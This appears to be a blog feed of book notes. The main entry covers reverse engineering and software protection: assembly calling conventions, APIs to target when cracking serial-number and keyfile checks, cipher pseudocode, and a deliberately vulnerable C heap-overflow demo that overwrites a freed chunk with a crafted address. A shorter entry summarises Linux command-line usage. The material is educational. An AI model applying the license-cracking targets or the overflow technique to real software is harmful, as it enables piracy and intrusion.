class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2                         ; Parameter 2<br>push p1                         ; Parameter 1<br>call test2<br>&#123;<br>    push ebp                    ; Original EBP pointer<br>    mov ebp, esp                ; New EBP pointer<br>    mov eax, dword ptr[ebp+0C]  ; Parameter 2<br>    mov ebx, dword ptr[ebp+08]  ; Parameter 1<br>    sub esp, 8                  ; Reserve space for local variables<br><br>    ...<br><br>    add esp, 8                  ; Release space of local variables<br>    pop ebp                     ; Original EBP pointer<br>    ret 8                       ; return (Equal to ret # add esp, 8)<br>                                ; 2 (Parameter) x 4h = 8<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>enter: push ebp # mov ebp,esp # sub esp, xxx</li><li>leave: add esp, xxx # pop ebp</li></ul><p>We can rewrite the script above<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enter xxxx, 0   ; Reserver space xxxx for local variable<br><br>...<br><br>leave<br>ret 8<br></code></pre></td></tr></table></figure></p><hr><p>Enable <strong>Maximum Speed</strong> in VC6.0<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p2<br>push p1<br>call test2<br>&#123;<br>    mov eax, dword ptr [esp+04]     ; Call parameter 1<br>    mov ecx, dword ptr [esp+08]     ; Call parameter 2<br><br>    ...<br><br>    ret 8                           ; return<br>&#125;<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Function"><a href="#Virtual-Function" class="headerlink" title="Virtual Function"></a>Virtual Function</h3><h1 id="Chapter-5-Software-Protection-Demonstration"><a href="#Chapter-5-Software-Protection-Demonstration" class="headerlink" title="Chapter 5 - Software Protection Demonstration"></a>Chapter 5 - Software Protection Demonstration</h1><h2 id="5-1-Serial-Number-and-KeyGen"><a href="#5-1-Serial-Number-and-KeyGen" class="headerlink" title="5.1 - Serial Number and KeyGen"></a>5.1 - Serial Number and KeyGen</h2><ol><li><script type="math/tex; mode=display"> \text{Serial Number} = F(\text{Username})</script></li><li><script type="math/tex; mode=display">\text{Username} = F^{-1}(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> F_1(\text{Username}) = F_2(\text{Serial Number})</script></li><li><script type="math/tex; mode=display"> Some value = F(\text{Username}, \text{Serial Number})</script></li></ol><h3 id="Exploiting-Serial-Number-Protection-Mechanism"><a href="#Exploiting-Serial-Number-Protection-Mechanism" class="headerlink" title="Exploiting Serial Number Protection Mechanism"></a>Exploiting Serial Number Protection Mechanism</h3><p>Commonly used API functions for Serial Number Protection:</p><ol><li>The following functions are commonly used for input:<ul><li>GetWindowTextA(W)</li><li>GetDlgItemTextA(W)</li><li>GetDlgItemInt</li><li>hmencpy (Windows 9x/Me only)</li></ul></li><li>The floowing functions are commonly used for messagebox:<ul><li>MessageBoxA(W)</li><li>MessageBoxExA(W)</li><li>ShowWindow</li><li>MessageBoxIndirectA(W)</li><li>CreateDialogParamA(W)</li><li>CreateDialogIndirectParamA(W)</li><li>DialogBoxParamA(W)</li><li>DialogBoxIndirectParamA(W)</li></ul></li><li>Other functions:<ol><li>Serial number might be stored in registry:<ul><li>RegQueryValueExA(W)</li></ul></li><li>Serial number might be stored in an INI file:<ul><li>GetPrivateProfileStringA(W)</li><li>GetPrivateProfileIntA(W)</li><li>GetProfileStringA(W)</li><li>GetProfileIntA(W)</li></ul></li><li>Serial number might be stored in other file:<ul><li>CreateFileA(W)</li><li>_lopen()</li></ul></li></ol></li></ol><h3 id="KeyFile-Protection"><a href="#KeyFile-Protection" class="headerlink" title="KeyFile Protection"></a>KeyFile Protection</h3><div class="table-container"><table><thead><tr><th>API Function</th><th>Description</th></tr></thead><tbody><tr><td>FindFirstFileA</td></tr><tr><td>CreateFileA, _lopen</td></tr><tr><td>GetFileSize, GetFileSizeEx</td></tr><tr><td>GetFileAttributesA, GetFileAttributesExA</td></tr><tr><td>SetFilePointer, SetFilePointerEx</td><td>Mov</td></tr><tr><td>ReadFile</td><td>Obtain file content.</td></tr></tbody></table></div><h2 id="5-7-Disk-Protection"><a href="#5-7-Disk-Protection" class="headerlink" title="5.7 - Disk Protection"></a>5.7 - Disk Protection</h2><h2 id="5-8-Single-Instance"><a href="#5-8-Single-Instance" class="headerlink" title="5.8 - Single Instance"></a>5.8 - Single Instance</h2><h1 id="Chapter-6-Cryptography-Algorithm"><a href="#Chapter-6-Cryptography-Algorithm" class="headerlink" title="Chapter 6 - Cryptography Algorithm"></a>Chapter 6 - Cryptography Algorithm</h1><h2 id="6-1-Hashing"><a href="#6-1-Hashing" class="headerlink" title="6.1 - Hashing"></a>6.1 - Hashing</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5 stands for <strong>Message Digest Algorithm 5</strong>.</p><script type="math/tex; mode=display">A = 01234567h\\B = 89abcdefh\\C = fedcba98h\\D = 76543210h\\</script><script type="math/tex; mode=display">\begin{align*}F(X,Y,Z) &= (X\&Y) | ((\sim X)\&Z)\\G(X,Y,Z) &= (X\&Z) | (Y\&(\sim Z))\\H(X,Y,Z) &= X\text{\textasciicircum}Y\text{\textasciicircum}Z\\I(X,Y,Z) &= Y\text{\textasciicircum}(X|(\sim Z))\end{align*}</script><h3 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h3><p>SHA stands for <strong>Secure Hash Algorithm</strong>.</p><ul><li>SHA-1</li><li>SHA-256</li><li>SHA-384</li><li>SHA-512</li></ul><h2 id="6-2-Symmetric-Encryption"><a href="#6-2-Symmetric-Encryption" class="headerlink" title="6.2 - Symmetric Encryption"></a>6.2 - Symmetric Encryption</h2><ul><li>DES (Data Encryption Standard)</li><li>IDEA (International Data Encryption Algorithm)</li><li>AES (Advanced Encryption Standard)</li><li>BlowFish</li><li>TwoFish</li></ul><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4 stands for <strong>Rivest Cipher 4</strong>.</p><p><strong>KSA (Key-Scheduling Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-KSA(Key)<br>    for i := 0 to 255 do<br>        S[i] := i<br>    end for<br><br>    j := 0<br>    for i := 0 to 255 do<br>        j := (j + S[i] + Key[i mod keylength]) mod 256<br>        swap S[i] and S[j]<br>    end for<br><br>    return S<br><br></code></pre></td></tr></table></figure></p><p><strong>PRGA (Pseudo-Random Generation Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-PRGA(S)<br>    i := 0<br>    j := 0<br><br>    while true do<br>        i := (i + 1) mod 256<br>        j := (j + S[i]) mod 256<br>        swap S[i] and S[j]<br>        t := (S[i] + S[j]) mod 256<br>        K := S[t]<br>        output K<br>    end while<br></code></pre></td></tr></table></figure></p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p>TEA stands for <strong>Tiny Encryption Algorithm</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Encrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 sum = 0;<br>    uint32 delta = 0x9E3779B9;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        v1 += ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Decrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 delta = 0x9E3779B9;<br>    uint32 sum = delta * 32;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        sum -= delta;<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><p>Where:</p><script type="math/tex; mode=display">\begin{align*}delta &= \frac{\sqrt{5} - 1}{2} \times 2^{32}\\&= (\sqrt{5} - 1) \times 2^{31}\end{align*}</script><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><h3 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a>BlowFish</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h1 id="Chapter-7-Windows-Kernel-Fundamentals"><a href="#Chapter-7-Windows-Kernel-Fundamentals" class="headerlink" title="Chapter 7 - Windows Kernel Fundamentals"></a>Chapter 7 - Windows Kernel Fundamentals</h1><h2 id="7-1-Kernel-Fundamentals"><a href="#7-1-Kernel-Fundamentals" class="headerlink" title="7.1 - Kernel Fundamentals"></a>7.1 - Kernel Fundamentals</h2><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/7.1.png'><img src="/images/books/SoftwareCrypto/7.1.png" width="500">    <figcaption>    Source: https://www.linkedin.com/pulse/windows-os-rings-role-event-monitoring-jacob-stickney-thv5c    </figcaption></p><h2 id="7-2-Important-Kernel-Data-Structure"><a href="#7-2-Important-Kernel-Data-Structure" class="headerlink" title="7.2 - Important Kernel Data Structure"></a>7.2 - Important Kernel Data Structure</h2><h2 id="7-3-Fundamentals-of-Kernel-Debugging"><a href="#7-3-Fundamentals-of-Kernel-Debugging" class="headerlink" title="7.3 - Fundamentals of Kernel Debugging"></a>7.3 - Fundamentals of Kernel Debugging</h2><h1 id="Chapter-8-Windows-Exception-Handling"><a href="#Chapter-8-Windows-Exception-Handling" class="headerlink" title="Chapter 8 - Windows Exception Handling"></a>Chapter 8 - Windows Exception Handling</h1><h2 id="8-1-Fundamentals-of-Exception-Handling"><a href="#8-1-Fundamentals-of-Exception-Handling" class="headerlink" title="8.1 - Fundamentals of Exception Handling"></a>8.1 - Fundamentals of Exception Handling</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">VOID RaiseException(<br>  [in] DWORD           dwExceptionCode,<br>  [in] DWORD           dwExceptionFlags,<br>  [in] DWORD           nNumberOfArguments,<br>  [in] const ULONG_PTR *lpArguments<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception<br></code></pre></td></tr></table></figure><p>When an interrupt or exception occurs, the CPU looks up the corresponding handler in the IDT.</p><p>The IDT (Interrupt Descriptor Table) is a linear table stored in memory. It consists of 256 entries. Each entry is 8 bytes long on x86 (32-bit) platforms and 16 bytes long on x64 (64-bit) platforms.</p><p>The base address and size of the IDT are described by the IDTR (IDT Register). The IDTR is 48 bits long on x86 systems. Although the IDTR can be accessed using the SIDT and LIDT instructions, the LIDT instruction can only be executed with Ring 0 privilege.</p><h2 id="8-2-SEH"><a href="#8-2-SEH" class="headerlink" title="8.2 - SEH"></a>8.2 - SEH</h2><h1 id="Chapter-9-Win32-API-Debugging"><a href="#Chapter-9-Win32-API-Debugging" class="headerlink" title="Chapter 9 - Win32 API Debugging"></a>Chapter 9 - Win32 API Debugging</h1><h1 id="Chapter-14-Vulnerability-Techniques"><a href="#Chapter-14-Vulnerability-Techniques" class="headerlink" title="Chapter 14 - Vulnerability Techniques"></a>Chapter 14 - Vulnerability Techniques</h1><h2 id="14-1-Software-Vulnerability"><a href="#14-1-Software-Vulnerability" class="headerlink" title="14.1 - Software Vulnerability"></a>14.1 - Software Vulnerability</h2><h3 id="Stack-Buffer-Overflow"><a href="#Stack-Buffer-Overflow" class="headerlink" title="Stack Buffer Overflow"></a>Stack Buffer Overflow</h3><h3 id="Heap-Buffer-Overflow"><a href="#Heap-Buffer-Overflow" class="headerlink" title="Heap Buffer Overflow"></a>Heap Buffer Overflow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;Windows.h&gt;<br><br>int main(int argc, char *argv[]) &#123;<br>    char str[] = &quot;\nHello123456789213456789\n&quot;;<br>    char *a, *b, *c;<br>    long *hHeap;<br>    hHeap = (long *)HeapCreate(0x00040000, 0, 0);<br>    printf(&quot;\n(+) Creating a heap at: 0x00%xh\n&quot;, hHeap);<br>    printf(&quot;(+) Allocating chunk A\n&quot;);<br><br>    a = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk=0x00%x\n&quot;, a, b);<br>    printf(&quot;(+) Freeing chunk B to the lookaside\n&quot;);<br>    HeapFree(hHeap, 0, b);<br>    printf(&quot;(+) Now overflow chunk A:\n&quot;);<br><br>    printf(&quot;%x\n&quot;, str);<br>    printf(str);<br>    memcpy(a, &quot;XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00&quot;, 28);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk C\n&quot;);<br>    c = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMROY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk B = 0x00%x\n(+) Chunk C=0x00%x\n&quot;, a, b, c);<br>    strcpy(c, &quot;AAAAAAAAAAAA\n&quot;);<br>    printf(str);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="14-2-Shellcode"><a href="#14-2-Shellcode" class="headerlink" title="14.2 - Shellcode"></a>14.2 - Shellcode</h1><h1 id="CHapter-15-Software-Unpacking"><a href="#CHapter-15-Software-Unpacking" class="headerlink" title="CHapter 15 - Software Unpacking"></a>CHapter 15 - Software Unpacking</h1><h2 id="15-2-Packer"><a href="#15-2-Packer" class="headerlink" title="15.2 - Packer"></a>15.2 - Packer</h2><ul><li>UPX</li><li>ASPack</li></ul><h2 id="15-3-Packer-Stub"><a href="#15-3-Packer-Stub" class="headerlink" title="15.3 - Packer Stub"></a>15.3 - Packer Stub</h2><ul><li>ASProtect</li><li>Armadillo</li><li>EXECryptor</li><li>Themida</li></ul><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="300"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Cryptography" scheme="http://example.com/tags/Cryptography/"/>
    
    <category term="Reverse Engineering" scheme="http://example.com/tags/Reverse-Engineering/"/>
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="WinDbg" scheme="http://example.com/tags/WinDbg/"/>
    
    <category term="Assembly" scheme="http://example.com/tags/Assembly/"/>
    
    <category term="MD5" scheme="http://example.com/tags/MD5/"/>
    
    <category term="AES" scheme="http://example.com/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Practical Linux Forenics</title>
    <link href="http://example.com/2026/01/14/2016-1-14-BookPracticalLinuxForensics/"/>
    <id>http://example.com/2026/01/14/2016-1-14-BookPracticalLinuxForensics/</id>
    <published>2026-01-14T06:05:22.000Z</published>
    <updated>2026-01-23T03:07:35.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/PracticalLinuxForensics/libro.jpg'><img src="/images/books/PracticalLinuxForensics/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] How Linux Works - WHAT EVERY SUPERUSER SHOULD KNOW</title>
    <link href="http://example.com/2026/01/14/2016-1-14-BookLinuxSuperUser/"/>
    <id>http://example.com/2026/01/14/2016-1-14-BookLinuxSuperUser/</id>
    <published>2026-01-14T06:01:33.000Z</published>
    <updated>2026-01-22T17:07:20.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/HowLinuxWorksSuperuser/libro.jpg'><img src="/images/books/HowLinuxWorksSuperuser/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] The Linux Command Line (2nd Edition)</title>
    <link href="http://example.com/2026/01/14/2016-1-14-BookLinuxCommand/"/>
    <id>http://example.com/2026/01/14/2016-1-14-BookLinuxCommand/</id>
    <published>2026-01-14T06:00:54.000Z</published>
    <updated>2026-01-26T14:58:38.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/TheLinuxCommandLine/libro.jpg'><img src="/images/books/TheLinuxCommandLine/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “The Linux Command Line (3rd Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-4-Manipulating-Files-and-Directories"><a href="#Chapter-4-Manipulating-Files-and-Directories" class="headerlink" title="Chapter 4 - Manipulating Files and Directories"></a>Chapter 4 - Manipulating Files and Directories</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp -u *.html destination<br></code></pre></td></tr></table></figure><h2 id="Wildcards"><a href="#Wildcards" class="headerlink" title="Wildcards"></a>Wildcards</h2><div class="table-container"><table><thead><tr><th>Wildcard</th><th>Meaning</th></tr></thead><tbody><tr><td>*</td><td>Matches any characters</td></tr><tr><td>?</td><td>Matches any single character</td></tr><tr><td>[characters]</td><td>Matches any character that is a member if the set <em>characters</em></td></tr><tr><td>[!characters]</td><td>Matches any character that is not a member of the set <em>characters</em></td></tr><tr><td>[[:class:]]</td><td>Matches any character that is a member of the specified class</td></tr></tbody></table></div><h3 id="Commonly-Used-Character-Classes"><a href="#Commonly-Used-Character-Classes" class="headerlink" title="Commonly Used Character Classes"></a>Commonly Used Character Classes</h3><div class="table-container"><table><thead><tr><th>Character class</th><th>Meaning</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>Matches any alphanumeric character</td></tr><tr><td>[:alpha:]</td><td>Matches any alphabetic character</td></tr><tr><td>[:digit:]</td><td>Matches any numeral</td></tr><tr><td>[:lower:]</td><td>Matches any lowercase letter</td></tr><tr><td>[:upper:]</td><td>Matches any uppercase letter</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Pattern</th><th>Matches</th></tr></thead><tbody><tr><td><code>*</code></td><td>All files</td></tr><tr><td><code>g*</code></td><td>Any file beginning with g</td></tr><tr><td><code>b*.txt</code></td><td>Any file beginning with b followed by any characters and ending with <code>.txt</code></td></tr><tr><td><code>Data???</code></td><td>Any file beginning with <code>Data</code> followed by exactly three characters</td></tr><tr><td><code>[abc]*</code></td><td>Any file beginning with either an a, a b, or a c</td></tr><tr><td><code>BACKUP.[0-9][0-9][0-9]</code></td><td>Any file beginning with <code>BACKUP.</code> followed by exactly three numerals</td></tr><tr><td><code>[[:upper:]]*</code></td><td>Any file beginning with an uppercase letter</td></tr><tr><td><code>[![:digit:]]*</code></td><td>Any file not beginning with a numeral</td></tr><tr><td><code>*[[:lower:]123]</code></td><td>Any file ending with a lowercase letter or the numerals 1, 2, or 3</td></tr></tbody></table></div><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mkdir dir1 dir2 dir3<br></code></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp item... directory<br></code></pre></td></tr></table></figure><p><strong>Useful options and Examples:</strong></p><div class="table-container"><table><thead><tr><th>Option</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-a</code>, <code>--archive</code></td><td>Copy the files and directories and all of their attributes, including ownerships and permissions. Normally, copies take on the default attributes of the user performing the copy.</td></tr><tr><td><code>-i</code>, <code>--interactive</code></td><td>Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, <code>cp</code> will silently overwrite files.</td></tr><tr><td><code>-r</code>, <code>--recursive</code></td><td>Recursively copy directories and their contents. This option (or the <code>-a</code> option) is required when copying directories.</td></tr><tr><td><code>-u</code>, <code>--update</code></td><td>When copying files from one directory to another, only copy files that either don’t exist or are newer than the existing corresponding files in the destination directory. Useful for skipping unnecessary copies.</td></tr><tr><td><code>-v</code>, <code>--verbose</code></td><td>Display informative messages as the copy is performed.</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Command</th><th>Results</th></tr></thead><tbody><tr><td><code>cp file1 file2</code></td><td>Copy <code>file1</code> to <code>file2</code>. If <code>file2</code> exists, it is overwritten with the contents of <code>file1</code>. If <code>file2</code> does not exist, it is created.</td></tr><tr><td><code>cp -i file1 file2</code></td><td>Same as the previous command, except that if <code>file2</code> exists, the user is prompted before it is overwritten.</td></tr><tr><td><code>cp file1 file2 dir1</code></td><td>Copy <code>file1</code> and <code>file2</code> into directory <code>dir1</code>. The directory <code>dir1</code> must already exist.</td></tr><tr><td><code>cp dir1/* dir2</code></td><td>Using a wildcard, copy all the files in <code>dir1</code> into <code>dir2</code>. The directory <code>dir2</code> must already exist.</td></tr><tr><td><code>cp -r dir1 dir2</code></td><td>Copy the contents of directory <code>dir1</code> to directory <code>dir2</code>. If <code>dir2</code> does not exist, it is created and will contain the same contents as <code>dir1</code>. If <code>dir2</code> does exist, then <code>dir1</code> (and its contents) will be copied into <code>dir2</code>.</td></tr></tbody></table></div><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><strong>Useful Options and Examples:</strong></p><div class="table-container"><table><thead><tr><th>Option</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-i</code>, <code>--interactive</code></td><td>Before overwriting an existing file, prompt the user for confirmation. <strong>If this option is not specified, <code>mv</code> will silently overwrite files</strong>.</td></tr><tr><td><code>-u</code>, <code>--update</code></td><td>When moving files from one directory to another, only move files that either don’t exist or are newer than the existing corresponding files in the destination directory.</td></tr><tr><td><code>-v</code>, <code>--verbose</code></td><td>Display informative messages as the move is performed.</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Command</th><th>Results</th></tr></thead><tbody><tr><td><code>mv file1 file2</code></td><td>Move <code>file1</code> to <code>file2</code>. If <code>file2</code> exists, it is overwritten with the contents of <code>file1</code>. If <code>file2</code> does not exist, it is created. In either case, <code>file1</code> ceases to exist.</td></tr><tr><td><code>mv -i file1 file2</code></td><td>Same as the previous command, except that if <code>file2</code> exists, the user is prompted before it is overwritten.</td></tr><tr><td><code>mv file1 file2 dir1</code></td><td>Move <code>file1</code> and <code>file2</code> into directory <code>dir1</code>. The directory <code>dir1</code> must already exist.</td></tr><tr><td><code>mv dir1 dir2</code></td><td>If directory <code>dir2</code> does not exist, create directory <code>dir2</code> and move the contents of directory <code>dir1</code> into <code>dir2</code>, then delete directory <code>dir1</code>. If directory <code>dir2</code> does exist, move directory <code>dir1</code> (and its contents) into directory <code>dir2</code>.</td></tr></tbody></table></div><h1 id="Chapter-6-Redirection"><a href="#Chapter-6-Redirection" class="headerlink" title="Chapter 6 - Redirection"></a>Chapter 6 - Redirection</h1><h2 id="Standard-Input-Output-and-Error"><a href="#Standard-Input-Output-and-Error" class="headerlink" title="Standard Input, Output and Error"></a>Standard Input, Output and Error</h2><h2 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h2><h1 id="Chapter-9-Permissions"><a href="#Chapter-9-Permissions" class="headerlink" title="Chapter 9 - Permissions"></a>Chapter 9 - Permissions</h1><h1 id="Chapter-15-Storage-Media"><a href="#Chapter-15-Storage-Media" class="headerlink" title="Chapter 15 - Storage Media"></a>Chapter 15 - Storage Media</h1><h1 id="Chapter-16-Networking"><a href="#Chapter-16-Networking" class="headerlink" title="Chapter 16 - Networking"></a>Chapter 16 - Networking</h1><h1 id="Chapter-18-Archiving-and-Backup"><a href="#Chapter-18-Archiving-and-Backup" class="headerlink" title="Chapter 18 - Archiving and Backup"></a>Chapter 18 - Archiving and Backup</h1><h1 id="Chapter-19-Regular-Expression"><a href="#Chapter-19-Regular-Expression" class="headerlink" title="Chapter 19 - Regular Expression"></a>Chapter 19 - Regular Expression</h1><h1 id="Chapter-23-Compiling-Programs"><a href="#Chapter-23-Compiling-Programs" class="headerlink" title="Chapter 23 - Compiling Programs"></a>Chapter 23 - Compiling Programs</h1><h1 id="Chapter-24-Writing-Your-First-Script"><a href="#Chapter-24-Writing-Your-First-Script" class="headerlink" title="Chapter 24 - Writing Your 